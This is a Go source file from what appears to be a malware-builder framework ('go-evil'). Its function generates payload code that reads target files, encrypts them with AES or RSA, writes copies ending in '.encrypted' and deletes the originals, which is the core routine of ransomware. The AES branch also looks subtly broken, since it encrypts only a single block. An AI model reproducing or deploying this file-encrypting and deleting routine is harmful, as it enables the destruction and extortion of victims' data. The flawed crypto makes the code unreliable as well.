package crypto

import (
	"fmt"

	"github.com/TeamPhoneix/go-evil/utility/structure"
)

// Encrypts the provided target
// The input can follow this format '${"<crypto system>", "<key>", "<'file'/'ext'/'dir'>", "<object>"}$'
// following the above format will "overwrite" all values in the struct before encrypting
func encrypt(value string, s_json string) ([]string, string) {
	data_object := structure.Receive(s_json)

	system_call := "encrypt"

	data_object.Add_go_function([]string{
		fmt.Sprintf("func %s(){", system_call),
		"if spine.crypt.method == \"\" || len(spine.crypt.target) == 0 || (spine.crypt.aes_key_length == 0 && spine.crypt.rsa_key_length == 0) {",
		"spine.log(\"Method, target or/and key has not been set for decryption\")",
		"return",
		"}",
		"for _, target := range spine.crypt.target{",
		"target = spine.variable.get(target)",
		"gut, err := ioutil.ReadFile(target)",

		"if err != nil{",
		"spine.log(err.Error())",
		"return",
		"}",
		"enc := \"\"",

		"switch (spine.crypt.method){",

		"\tcase \"aes\":",
		"cipher, err := aes.NewCipher([]byte(spine.crypt.aes_key))",
		"if err != nil{",
		"spine.log(err.Error())",
		"return",
		"}",
		"for (len(gut) < spine.crypt.aes_key_length){",
		"gut = append(gut, []byte(\"X\")...)",
		"}",
		"buffer := make([]byte, len(gut))",
		"cipher.Encrypt(buffer, gut)",
		"enc = hex.EncodeToString(buffer)",

		"\tcase \"rsa\":",
		"enc_byte, err := rsa.EncryptOAEP(sha256.New(), rand.Reader, &spine.crypt.rsa_public, []byte(gut), nil)",
		"if err != nil{",
		"spine.log(err.Error())",
		"return",
		"}",
		"enc = hex.EncodeToString(enc_byte)",
		"}",
		"if spine.crypt.extension == \"\"{",
		"spine.crypt.extension = \".encrypted\"",
		"}",
		"ioutil.WriteFile(fmt.Sprintf(\"%s%s\", target, spine.crypt.extension), []byte(enc), 0644)",
		"os.Remove(target)",
		"}",

		"}"})

	data_object.Add_go_import("os")
	data_object.Add_go_import("fmt")
	data_object.Add_go_import("io/ioutil")
	data_object.Add_go_import("encoding/hex")
	data_object.Add_go_import("crypto/aes")
	data_object.Add_go_import("crypto/rsa")
	data_object.Add_go_import("crypto/sha256")
	data_object.Add_go_import("crypto/rand")
	data_object.Add_go_import("github.com/s9rA16Bf4/notify_handler/go/notify")

	return []string{fmt.Sprintf("%s()", system_call)}, structure.Send(data_object)
}